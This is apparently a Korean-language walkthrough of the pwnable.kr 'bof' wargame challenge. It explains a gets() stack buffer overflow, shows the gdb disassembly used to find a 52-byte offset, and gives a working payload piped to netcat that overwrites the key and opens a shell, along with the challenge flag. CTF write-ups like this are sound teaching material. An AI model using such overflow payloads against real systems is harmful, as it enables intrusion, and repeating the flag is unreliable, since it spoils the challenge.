Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

========================================================================================


main function
0xdeadbeef 값을 func() 함수로 호출

func()
/bin/sh 로 쉘을 띄움
int 형의 값이 0xcafebabe 로 변경해야 쉘을 땀

gets(overfloawme ) 라는 char형에 32바이트를 배열에 저장하라.
gets 로 32비트 이상을 넣어주면 버퍼오버플로우 발생






gdb -q bof
set disassembly-flavor intel
disas func

======================================================================
pental@PDM0205-E1:~/sh/pwnable.kr/bof$ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave
   0x00000689 <+93>:    ret
End of assembler dump.


+40 부분에 ebp + 8의 위치에 key가 저장됨

== 0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe

+29 부분에서는 ebp-0x2c 이므로 

0x8에대가 0x2c를 더하므로 0x8 = 8 , 0x2c = 44
52
52바이트를 덮어주면 key를 변결할수 있다.

==============================Result====================================================
pental@PDM0205-E1:~/sh/pwnable.kr/bof$ (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)


PAYLOAD = (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
FLAG = daddy, I just pwned a buFFer :)


자세한 풀이

http://noisivohees.tistory.com/11


=======================================================================================================================
pwnable.kr Toddler's Bottle 3번째 문제인 bof 문제 풀이 시작하겠습니다.

먼저 이전 문제들과 동일하게 열어보면 다음과 같은 화면이 나오네요



이 문제는 buffer overflow문제라고 나와있네요
문제에 대한 바이너리와 c 소스를 다운받을 수 있는 곳이 나와있고

nc를 통해 접속하여 푸는 문제라고 나와있습니다. 
nc란 netcat의 줄임말로, TCP/UDP 프토토콜을 사용하는 네트워크 연결에서 데이터를 읽고 쓸 수 있는
가벼운 유틸리티라고 합니다.
UNIX계열의 cat을 보면 파일을 대상으로 읽고 쓰는데
Netcat는 network connection에 읽고 쓰는 것이라고 합니다.
포너블 문제들을 보면 ssh를 통해 원격 터미널 접속을 통해 문제를 풀기도하지만
nc 서버로 접속해 문제를 푸는 경우도 많기 때문에 알아둬야 할 접속방법 중에 하나입니다.

이제 문제에서 주어진 파일과 C 소스를 살펴보겠습니다.
먼저 C소스를 통해 이 파일이 어떤 파일인지 살펴보겠습니다.




소스를 열어보니 다음과 같은 짧은 코드가 나옵니다.
먼저 메인함수를 보니 0xdeadbeef란 값을 전달인자로 func()함수를 호출하는 부분만 있는 것을 확인 할 수 있는데요

이제 func()함수에서 어떤 취약점이 발생 할 수 있는지 살펴보겠습니다.
소스에서 볼 떄 시스템함수로 /bin/sh 즉 쉘을 띄워주는 명령을 볼 수 있습니다.
따라서 쉘이 띄워지려면 if의 조건인 func()함수의 전달인자인 int 형 key값이 0xcafebabe로 설정이 되어야합니다.

그런데 key값은 방금 전 fun()의 전달인자로서 0xdeadbeef값을 가지고 있는데
이 값을 어떻게 변경 할 수 있을까요?

key 값에 영향을 줄 수 있는 코드들을 살펴보니
바로 위에 gets(overflowme)라는 코드가 나옵니다.
이 코드느 gets함수 즉 stdin을 통해 입력받은 데이터를
overflow라는 char형 32바이트 배열에 저장하라는 코드입니다.
 
따라서 사용자가 입력을 해주게 되면 그 값이 overflowme라는
배열에 저장이 될 것입니다.

이 때 만약 사용자가 배열을 통해 할당을 받고 사용하는 메모리인
overflowme 배열의 시작주소로부터 32바이트만큼의
영역을 넘어선 크기만큼 데이터를을 입력할 경우
할당받지 않은 메모리 영역에 데이터가 저장이 될 것입니다.
이러한 방식으로 발생하는 취약점을 bufferoverflow 취약점이라고 합니다.

그렇다면 입력 초과로 덮어쓰여지는 데이터 영역에는 원래 어떤 값이 저장되어있을까요?
func()함수의 호출 과정을 살펴보면 이에 대한 답을 찾을 수가 있습니다.

 높은 메모리 주소 ->  낮은 메모리 주소 
func()의 전달인자(0xdeadbeef) | RET | SFP | (더미?) | 32바이트 overflowme배열 

overflowme 배열의 overflow를 통해 위와 같은 데이터를 덮어쓸 수 있을 것이라고 추정할 수 있습니다.

overflowem 배열에 32바이트 이상의 데이터를 저장하게 되면
SFP, RET를 덮을 수 있고 저희가 덮어써야 할 데이터인 0xdeadbeef 를 덮어 쓸 수 있을 것입니다.

여기서 정확하게 얼마만큼의 데이터를 덮어써야하는지 계산하기 위해서는
프로그램이 실행 될 때 메모리에 데이터가 어떻게 올라가는지 알아야 합니다.
이를 살펴보기 위한 여러가지 방법이 있는데
저은 일단 여러가지 방법 중 기본적으로 사용되는 gdb를 이용하여 분석해보겠습니다.


문제에서 주어진 바이너리를 일단 제 가상환경인 우분투에 올려서 gdb를 통해 분석해보려고합니다.


gdb를 통해 파일을 열고, 인텔문법으로 변환하였습니다.

이제 저희는 func함수가 정확히 어떤 메모리 상태를 갖는지 확인을 해보면 됩니다.



뭐 자세하게 메모리가 어떻게 생겼는지 안살펴봐도
key값과 비교하는 부분인 <+40>을 보면 ebp+8의 위치에 key값이 저장되어있고

key값을 비교하기 전에 gets(overflowme)를 하기 전에 전달인자를 주는 부분인 <+29> 부분을 보면
stdin의 입력값을 저장할 overflowme배열의 시작 주소가 ebp-0x2c라는 것을 알 수 있네요

따라서 이들의 거리를 10진수로 변환한 52바이트 만큼의 크기만큼 데이터를 덮어주게 되면
key값을 변경 할 수 있다는 것을 알 수 있습니다.

다음과 같이 실제로 스크립트를 작성해보면




익스플로잇 성공!! flag의 내용을 볼 수 있습니다
